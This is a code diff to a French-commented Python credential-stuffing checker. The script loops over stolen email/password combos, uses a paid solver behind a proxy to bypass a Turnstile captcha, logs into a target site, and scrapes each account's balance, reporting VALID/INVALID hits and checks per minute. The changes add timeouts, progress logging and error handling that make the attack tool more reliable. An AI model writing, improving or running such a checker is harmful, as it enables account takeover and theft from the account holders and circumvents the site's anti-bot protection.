@@ -89,6 +89,16 @@ POLL_MAX_ATTEMPTS = 80
 # 0 = afficher la SOURCE complète ; sinon tronquer (octets affichés)
 SOURCE_PREVIEW_MAX = 12000
 
+# Timeouts requests : (connexion TCP/proxy, lecture). Évite un blocage silencieux si le proxy ne répond pas.
+TIMEOUT_CONNECT_SEC = 25
+TIMEOUT_READ_SEC = 120
+REQUEST_TIMEOUT = (TIMEOUT_CONNECT_SEC, TIMEOUT_READ_SEC)
+
+
+def log(msg: str) -> None:
+    """Affichage immédiat (important sous Windows cmd si le script semble « figé »)."""
+    print(msg, flush=True)
+
 
 def proxy_dict(url: str) -> dict[str, str]:
     return {"http": url, "https": url}
@@ -144,7 +154,7 @@ def create_turnstile_task(sess: requests.Session) -> tuple[str | None, str, int]
         SOLVER_CREATE,
         headers={**SOLVER_HEADERS, "Content-Type": "application/json"},
         data=json.dumps(payload),
-        timeout=120,
+        timeout=REQUEST_TIMEOUT,
     )
     src = r.text
     code = r.status_code
@@ -160,12 +170,20 @@ def create_turnstile_task(sess: requests.Session) -> tuple[str | None, str, int]
         return None, src, code
 
 
-def poll_task_result(sess: requests.Session, task_id: str) -> tuple[str | None, str, int]:
+def poll_task_result(
+    sess: requests.Session,
+    task_id: str,
+    *,
+    progress_label: str = "",
+) -> tuple[str | None, str, int]:
     payload = {"clientKey": SOLVER_KEY, "taskId": task_id}
     body = json.dumps(payload)
     last_text = ""
     last_code = 0
-    for _ in range(POLL_MAX_ATTEMPTS):
+    for attempt in range(POLL_MAX_ATTEMPTS):
+        if attempt == 0 or (attempt + 1) % 5 == 0 or attempt == POLL_MAX_ATTEMPTS - 1:
+            prefix = f"{progress_label} " if progress_label else ""
+            log(f"{prefix}getTaskResult essai {attempt + 1}/{POLL_MAX_ATTEMPTS} …")
         r = sess.post(
             SOLVER_RESULT,
             headers={
@@ -173,7 +191,7 @@ def poll_task_result(sess: requests.Session, task_id: str) -> tuple[str | None, 
                 "Content-Type": "application/x-www-form-urlencoded",
             },
             data=body,
-            timeout=120,
+            timeout=REQUEST_TIMEOUT,
         )
         last_text = r.text
         last_code = r.status_code
@@ -248,7 +266,7 @@ def post_login(
         LOCAL_BASE,
         data=body.encode("utf-8"),
         headers=headers,
-        timeout=120,
+        timeout=REQUEST_TIMEOUT,
     )
 
 
@@ -296,7 +314,7 @@ def get_balance_page(sess: requests.Session, token: str, proxy_url: str) -> tupl
         "postProxy": proxy_url,
         "Cookie": cookie,
     }
-    r = sess.get(LOCAL_BASE, headers=headers, timeout=120)
+    r = sess.get(LOCAL_BASE, headers=headers, timeout=REQUEST_TIMEOUT)
     return r.text, r.status_code
 
 
@@ -313,13 +331,15 @@ def print_source(label: str, text: str, status_code: int | None = None) -> None:
     if status_code is not None:
         head += f" [HTTP {status_code}]"
     head += " ---"
-    print(head)
+    log(head)
     if SOURCE_PREVIEW_MAX and len(text) > SOURCE_PREVIEW_MAX:
-        print(text[:SOURCE_PREVIEW_MAX])
-        print(f"... [tronqué — {len(text)} octets au total, SOURCE_PREVIEW_MAX={SOURCE_PREVIEW_MAX}]")
+        log(text[:SOURCE_PREVIEW_MAX])
+        log(
+            f"... [tronqué — {len(text)} octets au total, SOURCE_PREVIEW_MAX={SOURCE_PREVIEW_MAX}]"
+        )
     else:
-        print(text)
-    print("--- fin SOURCE ---\n")
+        log(text)
+    log("--- fin SOURCE ---\n")
 
 
 def fmt_rates(
@@ -365,36 +385,65 @@ def main() -> int:
     local_sess = requests.Session()
     local_sess.trust_env = False
 
-    print(f"{len(combos)} ligne(s) à traiter.\n")
+    n_total = len(combos)
+    log(f"{n_total} ligne(s) à traiter.")
+    log(
+        f"Démarrage combo 1/{n_total} : étape solver (proxy → {SOLVER_CREATE.split('/')[2]}), "
+        f"timeouts connexion={TIMEOUT_CONNECT_SEC}s lecture={TIMEOUT_READ_SEC}s."
+    )
+    log("(Si rien ne bouge plus de ~30s, vérifie le proxy / pare-feu / crédits DataImpulse.)\n")
 
     for email, password in combos:
         processed += 1
 
-        task_id, src_create, code_create = create_turnstile_task(solver_sess)
+        log(f"[{processed}/{n_total}] {email} — createTask (solver via proxy)…")
+        try:
+            task_id, src_create, code_create = create_turnstile_task(solver_sess)
+        except requests.RequestException as e:
+            invalid += 1
+            elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
+            rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
+            log(f"[{processed}] INVALID (solver createTask réseau: {e!s}) | {rates}")
+            continue
+
         if not task_id:
             invalid += 1
             elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
             rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
-            print(f"[{processed}] INVALID (solver createTask) | {rates}")
+            log(f"[{processed}] INVALID (solver createTask) | {rates}")
             print_source("solver createTask", src_create, code_create)
             continue
 
-        tk, src_poll, code_poll = poll_task_result(solver_sess, task_id)
+        log(f"[{processed}/{n_total}] {email} — attente résolution captcha (getTaskResult)…")
+        try:
+            tk, src_poll, code_poll = poll_task_result(
+                solver_sess,
+                task_id,
+                progress_label=f"[{processed}/{n_total}]",
+            )
+        except requests.RequestException as e:
+            invalid += 1
+            elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
+            rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
+            log(f"[{processed}] INVALID (solver getTaskResult réseau: {e!s}) | {rates}")
+            continue
+
         if not tk:
             invalid += 1
             elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
             rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
-            print(f"[{processed}] INVALID (solver timeout / pas de token) | {rates}")
+            log(f"[{processed}] INVALID (solver timeout / pas de token) | {rates}")
             print_source("solver getTaskResult (dernière réponse)", src_poll, code_poll)
             continue
 
+        log(f"[{processed}/{n_total}] {email} — login via {LOCAL_BASE} …")
         try:
             login_resp = post_login(local_sess, email, password, tk, proxy_url)
         except requests.RequestException as e:
             invalid += 1
             elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
             rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
-            print(f"[{processed}] INVALID (login req {e!s}) | {rates}")
+            log(f"[{processed}] INVALID (login req {e!s}) | {rates}")
             continue
 
         body = login_resp.text
@@ -404,7 +453,7 @@ def main() -> int:
             invalid += 1
             elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
             rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
-            print(f"[{processed}] INVALID {email!s} | {rates}")
+            log(f"[{processed}] INVALID {email!s} | {rates}")
             print_source("login POST", body, login_resp.status_code)
             continue
 
@@ -413,21 +462,20 @@ def main() -> int:
             invalid += 1
             elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
             rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
-            print(f"[{processed}] INVALID (pas de token) {email!s} | {rates}")
+            log(f"[{processed}] INVALID (pas de token) {email!s} | {rates}")
             print_source("login POST", body, login_resp.status_code)
             continue
 
         print_source("login POST", body, login_resp.status_code)
 
+        log(f"[{processed}/{n_total}] {email} — récupération page solde…")
         try:
             html, bal_code = get_balance_page(local_sess, token, proxy_url)
         except requests.RequestException as e:
             valid += 1
             elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
             rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
-            print(
-                f"[{processed}] VALID {email!s} (solde: erreur requête {e!s}) | {rates}"
-            )
+            log(f"[{processed}] VALID {email!s} (solde: erreur requête {e!s}) | {rates}")
             continue
 
         print_source("GET compte.htm (solde)", html, bal_code)
@@ -441,14 +489,14 @@ def main() -> int:
         rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
         solde_s = f"{solde}" if solde is not None else "?"
         flag = " [CUSTOM solde<30]" if solde is not None and solde < 30 else ""
-        print(f"[{processed}] VALID {email!s} solde={solde_s}{flag} | {rates}")
+        log(f"[{processed}] VALID {email!s} solde={solde_s}{flag} | {rates}")
 
     elapsed = time.monotonic() - t0
     em = max(elapsed / 60.0, 1e-6)
     cpm_total = processed / em
     cpm_valid = valid / em
     cpm_invalid = invalid / em
-    print(
+    log(
         f"\nTerminé en {elapsed:.1f}s — valid={valid} invalid={invalid} "
         f"custom_solde<30={custom_low} "
         f"CPM≈{cpm_total:.1f} CPM_valid≈{cpm_valid:.1f} CPM_invalid≈{cpm_invalid:.1f}"
